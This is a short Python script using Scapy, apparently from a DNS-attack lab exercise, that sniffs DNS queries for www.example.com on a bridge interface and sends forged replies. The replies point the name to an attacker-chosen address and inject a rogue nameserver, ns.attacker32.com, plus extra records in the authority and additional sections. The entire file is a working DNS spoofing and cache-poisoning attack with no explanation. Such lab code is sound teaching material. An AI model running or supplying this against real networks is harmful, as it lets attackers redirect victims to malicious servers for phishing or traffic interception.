from scapy.all import *

def spoof_add(pkt):
    if(DNS in pkt and "www.example.com" in pkt[DNS].qd.qname.decode('utf-8')):
        print("=== Packet info ===")
        print(f"IP Source: {pkt[IP].src}")
        print(f"IP Destination: {pkt[IP].dst}")
        print(f"Source port: {pkt[UDP].sport}")
        print(f"Destination port: {pkt[UDP].dport}")
        print("\n\n")

        # IP and UDP header
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        udp = UDP(sport = 53, dport = pkt[UDP].sport)

        # Answer section
        AnsRR = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 500, rdata = "10.9.0.153")

        # Authority section
        AuRR1 = DNSRR(rrname = "example.com", type = 'NS', ttl = 600, rdata = "ns.attacker32.com")
        AuRR2 = DNSRR(rrname = "example.com", type = 'NS', ttl = 600, rdata = "ns.example.com")

        # Additional section
        AddRR1 = DNSRR(rrname = "ns.attacker32.com", ttl = 600, rdata = "1.2.3.4")
        AddRR2 = DNSRR(rrname = "ns.example.net", ttl = 600, rdata = "5.6.7.8")
        AddRR3 = DNSRR(rrname = "www.facebook.com", ttl = 600, rdata = "3.4.5.6")

        # DNS header
        dns = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, qr = 1, rd = 0, aa = 1, ancount = 1, nscount = 2, 
                    arcount = 3, an = AnsRR, ns = AuRR1/AuRR2, ar = AddRR1/AddRR2/AddRR3)
        
        # Create a spoofed packet
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)

f = "udp and (src host 10.8.0.11 and dst port 53)"
pkt = sniff(iface = "br-9f231f4c1dbc", filter = f, prn = spoof_add)